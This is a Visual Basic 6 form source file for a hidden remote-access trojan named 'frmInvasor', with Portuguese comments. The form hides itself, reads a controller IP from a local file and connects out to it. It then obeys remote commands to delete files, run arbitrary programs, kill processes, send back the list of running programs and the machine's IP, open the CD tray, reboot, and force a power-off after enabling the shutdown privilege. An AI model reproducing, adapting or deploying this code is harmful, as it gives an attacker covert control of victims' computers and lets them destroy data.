VERSION 5.00
Begin VB.Form frmInvasor 
   BorderStyle     =   0  'None
   ClientHeight    =   3285
   ClientLeft      =   19935
   ClientTop       =   13830
   ClientWidth     =   4620
   ControlBox      =   0   'False
   Icon            =   "inv.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3285
   ScaleWidth      =   4620
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.TextBox txtIP 
      Height          =   375
      Left            =   2850
      TabIndex        =   3
      Text            =   "Text1"
      Top             =   1800
      Width           =   825
   End
   Begin gr33nsn4k3.Winsock w1 
      Left            =   1290
      Top             =   1650
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   800
      Left            =   2145
      Top             =   690
   End
   Begin VB.ListBox List1 
      Height          =   255
      Left            =   660
      TabIndex        =   2
      Top             =   570
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   420
      Left            =   660
      TabIndex        =   1
      Top             =   570
      Width           =   420
   End
   Begin VB.Label Label1 
      Height          =   420
      Left            =   660
      TabIndex        =   0
      Top             =   570
      Width           =   420
   End
End
Attribute VB_Name = "frmInvasor"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const MAX_PATH& = 260
Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szexeFile As String * MAX_PATH
End Type
Dim uProcess As PROCESSENTRY32
Dim rProcessFound As Long
Dim hSnapshot As Long
Dim szExename As String
Dim nome As String
Dim eu As String
Dim desliga As Boolean
Dim fil123123 As String
Dim linedata123 As String
Dim exitCode As Long
Dim myProcess As Long
Dim AppKill As Boolean
Dim appCount As Integer
Dim i As Integer
Private Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long


Dim X(100), Y(100), Z(100) As Integer
Dim tmpX(100), tmpY(100), tmpZ(100) As Integer
Dim K As Integer
Dim Zoom As Integer
Dim Speed As Integer
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Const WM_CLOSE = &H10

Private Type SECURITY_ATTRIBUTES

nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type
Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long

Private Type LUID
         UsedPart As Long
         IgnoredForNowHigh32BitPart As Long
      End Type

      Private Type TOKEN_PRIVILEGES
        PrivilegeCount As Long
        TheLuid As LUID
        Attributes As Long
      End Type

      Private Const EWX_SHUTDOWN As Long = 1
      Private Const EWX_FORCE As Long = 4
      Private Const EWX_REBOOT = 2
      Private Const EWX_POWEROFF As Long = 8

      Private Declare Function ExitWindowsEx Lib "user32" (ByVal _
           dwOptions As Long, ByVal dwReserved As Long) As Long

      Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
      Private Declare Function OpenProcessToken Lib "advapi32" (ByVal _
         ProcessHandle As Long, _
         ByVal DesiredAccess As Long, TokenHandle As Long) As Long
      Private Declare Function LookupPrivilegeValue Lib "advapi32" _
         Alias "LookupPrivilegeValueA" _
         (ByVal lpSystemName As String, ByVal lpName As String, lpLuid _
         As LUID) As Long
      Private Declare Function AdjustTokenPrivileges Lib "advapi32" _
         (ByVal TokenHandle As Long, _
         ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES _
         , ByVal BufferLength As Long, _
      PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Private Sub AdjustToken()
         Const TOKEN_ADJUST_PRIVILEGES = &H20
         Const TOKEN_QUERY = &H8
         Const SE_PRIVILEGE_ENABLED = &H2
         Dim hdlProcessHandle As Long
         Dim hdlTokenHandle As Long
         Dim tmpLuid As LUID
         Dim tkp As TOKEN_PRIVILEGES
         Dim tkpNewButIgnored As TOKEN_PRIVILEGES
         Dim lBufferNeeded As Long

         hdlProcessHandle = GetCurrentProcess()
         OpenProcessToken hdlProcessHandle, (TOKEN_ADJUST_PRIVILEGES Or _
            TOKEN_QUERY), hdlTokenHandle
         LookupPrivilegeValue "", "SeShutdownPrivilege", tmpLuid

         tkp.PrivilegeCount = 1
         tkp.TheLuid = tmpLuid
         tkp.Attributes = SE_PRIVILEGE_ENABLED
         AdjustTokenPrivileges hdlTokenHandle, False, _
         tkp, Len(tkpNewButIgnored), tkpNewButIgnored, lBufferNeeded
     End Sub
Private Sub HideMeFromTaskList()
On Error Resume Next
  App.TaskVisible = False
End Sub

Public Function GetCaption(lhWnd As Long) As String

Dim sA As String, lLen As Long

   lLen& = GetWindowTextLength(lhWnd&)

      sA$ = String(lLen&, 0&)

   Call GetWindowText(lhWnd&, sA$, lLen& + 1)
   GetCaption$ = sA$

End Function
Public Function DLHFindWin(frm As Form, WinTitle As String, _
CaseSensitive As Boolean) As Long

Dim lhWnd As Long, sA As String

   lhWnd& = frm.hwnd


Do

   DoEvents
      If lhWnd& = 0 Then Exit Do
         If CaseSensitive = False Then
             sA$ = LCase$(GetCaption(lhWnd&))
             WinTitle$ = LCase$(WinTitle$)
         Else
             sA$ = GetCaption(lhWnd&)
         End If

       If InStr(sA$, WinTitle$) Then
          DLHFindWin& = lhWnd&
          Exit Do
       Else
         DLHFindWin& = 0
       End If

       lhWnd& = GetNextWindow(lhWnd&, 2)

Loop

End Function


Public Sub CreateNewDirectory(NewDirectory As String)
    Dim sDirTest As String
    Dim SecAttrib As SECURITY_ATTRIBUTES
    Dim bSuccess As Boolean
    Dim sPath As String
    Dim iCounter As Integer
    Dim sTempDir As String
    iFlag = 0
    sPath = NewDirectory
    
    If Right(sPath, Len(sPath)) <> "\" Then
        sPath = sPath & "\"
    End If
    
    iCounter = 1
    
    Do Until InStr(iCounter, sPath, "\") = 0
        iCounter = InStr(iCounter, sPath, "\")
        sTempDir = Left(sPath, iCounter)
        sDirTest = dir(sTempDir)
        iCounter = iCounter + 1
        SecAttrib.lpSecurityDescriptor = &O0
        SecAttrib.bInheritHandle = False
        SecAttrib.nLength = Len(SecAttrib)
        bSuccess = CreateDirectory(sTempDir, SecAttrib)
    Loop

End Sub
Private Function KillApp(myName As String) As Boolean

Const PROCESS_ALL_ACCESS = 0

On Local Error GoTo Finish
appCount = 0

Const TH32CS_SNAPPROCESS As Long = 2&

uProcess.dwSize = Len(uProcess)
hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
rProcessFound = ProcessFirst(hSnapshot, uProcess)
List1.Clear

Do While rProcessFound
i = InStr(1, uProcess.szexeFile, Chr(0))
szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
List1.AddItem (szExename)
If Right$(szExename, Len(myName)) = LCase$(myName) Then
KillApp = True
appCount = appCount + 1
myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
AppKill = TerminateProcess(myProcess, exitCode)
Call CloseHandle(myProcess)
End If


rProcessFound = ProcessNext(hSnapshot, uProcess)
Loop

Call CloseHandle(hSnapshot)
Finish:
End Function
 Function FileExist(path$) As Integer
    Dim X
    X = FreeFile
    On Error Resume Next
    Open path$ For Input As X
    FileExist = IIf(Err = 0, True, False)
    Close X
    Err = 0
End Function

Public Function InStrRevVB5(ByVal StringCheck As String, ByVal StringMatch As String, Optional ByVal Start As Long = -1) As Long
    Dim lPos        As Long
    Dim lSavePos    As Long
    If Start = -1 Then Start = Len(StringCheck)
    lPos = InStr(1, StringCheck, StringMatch, vbBinaryCompare)
    While lPos > 0 And lPos < Start
        lSavePos = lPos
        lPos = InStr(lPos + 1, StringCheck, StringMatch, vbBinaryCompare)
    Wend
    InStrRevVB5 = lSavePos
End Function
Public Sub ShowMeInTaskList()
On Error Resume Next
    App.TaskVisible = True
End Sub

Public Sub CloseMe()
On Error Resume Next
On Error Resume Next
lngResult = ExitWindows(EWX_REBOOT, 0&)
  Exit Sub
End Sub

Private Sub Command1_Click()
On Error Resume Next
ShowMeInTaskList
End Sub

Private Sub carregar()

txtIP.Text = Empty
fil123123 = "C:\ip.txt"
 Open fil123123 For Input As #1

    Input #1, linedata123
txtIP.Text = linedata123

  Close #1

'If App.PrevInstance = True Then Unload Me
'On Error Resume Next
'App.TaskVisible = False


'HideMeFromTaskList

'Do Until w1.State = sckConnected
w1.RemotePort = 23
w1.RemoteHost = linedata123
w1.Connect

End Sub



Private Sub Form_Load()
carregar
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
On Error Resume Next
w1.CloseSck
End Sub





Private Sub w1_Close()
w1.Listen
End Sub



Private Sub w1_ConnectionRequest(ByVal requestID As Long)

'w1.Accept requestID
End Sub

Private Sub w1_DataArrival(ByVal bytesTotal As Long)
'Eventos que acontecem quando recebemos as mensagens, ou
'seja, os dados do Servidor
On Error Resume Next
Dim str As String
 'Declaração dos dados que o servidor vai nos enviar

w1.GetData str
Dim file As String
If Left$(str, 4) = "del " Then
file = Right$(str, Len(str) - 4)
Kill file
End If

'''''''''''''''
Dim msg As String
If Left$(str, 4) = "msg " Then
msg = Right$(str, Len(str) - 4)
MsgBox msg, , "Mensagem"
End If
''''''''''''''''
Dim exe As String
If Left$(str, 4) = "exe " Then
exe = Right$(str, Len(str) - 4)
Call Shell(exe, vbMaximizedFocus)
End If
''''''''''''''''''
Dim dir As String
If Left$(str, 4) = "mkd " Then
dir = Right$(str, Len(str) - 4)
CreateNewDirectory (dir)
End If
''''''''''''''''''
Dim prg As String
If Left$(str, 4) = "cpr " Then
prg = Right$(str, Len(str) - 4)
KillApp (prg)
End If
'''''''''''''''''


'Então o w1 aceita os dados, ou seja, a mensagem que
'o servidor enviou e coloca eles na caixa de textos txtPapo.text
Select Case str
Case "note"
Shell "notepad.exe", vbMaximizedFocus
''''''''''''''''''''''''''''
Case "calc"
Shell "calc.exe", vbMaximizedFocus
''''''''''''''''''''''''''''
Case "fecha"
Unload Me
''''''''''''''''''''''''''''
Case "checknet"
'EnumWindows AddressOf EnumProc, 0
info = App.path & "\" & App.EXEName
w1.SendData info
'''''''''''''''''''''''
Case "pain"
Shell "pbrush", vbMaximizedFocus
'''''''''''''''''''''''''''
Case "lstexe"
w1.SendData "Executáveis rodando" & vbCrLf
w1.SendData "IP: " & w1.LocalIP & " - " & Time & " - " & Date & vbCrLf
listaProgs
Case "close"
CloseMe
''''''''''''''''
Case "closeteg"
ghw = FindWindow(vbNullString, "TeG_Chat_cli")
PostMessage ghw, WM_CLOSE, CLng(0), CLng(0)
Case "ctrl"
Shell "control", vbMaximizedFocus
''''''''''''''''''''''
Case "mplayer"
Shell "mplayer", vbMaximizedFocus
'''''''''''''''
Case "scan"
Shell "scandskw", vbMaximizedFocus
Case "sol"
Shell "sol", vbMaximizedFocus
Case "word"
Shell "C:\Arquivos de programas\Microsoft Office\Office10\WINWORD.EXE", vbMaximizedFocus 'or change as required
'''''''''''
Case "vb6"
Shell "C:\Arquivos de programas\Microsoft Visual Studio\VB98\VB6.EXE", vbMaximizedFocus 'or change as required
'''''''''''
Case "cddooropen"
retvalue& = mciSendString("set CDAudio door open", returnstring, 127, 0)
If retvalue& <> 0 Then
   OpenCDDrive = 0
Else
   OpenCDDrive = 1
End If
'''''''''''''''''''''''''
Case "dir"
'''''''''''
CreateNewDirectory ("c:\7£r@bY7£\Invadiu\Seu\PC")
'''''''''''''
Case "shutdown"
AdjustToken
       ExitWindowsEx (EWX_POWEROFF), &HFFFF
Case "closeme"
''''''''''''
frmInit.Show
Unload Me
Case "wintime"
Dim lngReturn As Long
lngReturn = GetTickCount()
info = ((lngReturn / 1000) / 60) & " minutos."
w1.SendData info
End Select
End Sub


Public Sub listaProgs()
List1.ListIndex = 0
For i = 0 To List1.ListCount - 1
w1.SendData List1.Text & vbCrLf
List1.ListIndex = i
Next i
End Sub

Private Sub w1_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
If w1.State = sckClosed Or sckClosing Then carregar
End Sub
